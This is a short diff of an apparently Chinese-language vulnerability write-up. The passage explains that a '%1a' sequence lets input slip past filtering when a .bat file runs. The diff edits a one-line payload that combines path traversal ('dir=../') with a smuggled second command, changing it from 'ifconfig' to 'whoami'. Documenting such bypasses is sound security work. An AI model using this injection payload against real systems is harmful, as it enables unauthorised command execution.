@@ -12,7 +12,7 @@
 执行.bat文件的时候，利用%1a，可以绕过过滤执行命令。
 payload:
 ```
-dir=../ %1a| ifconfig
+dir=../ %1a whoami
 ```
 
 # Refference
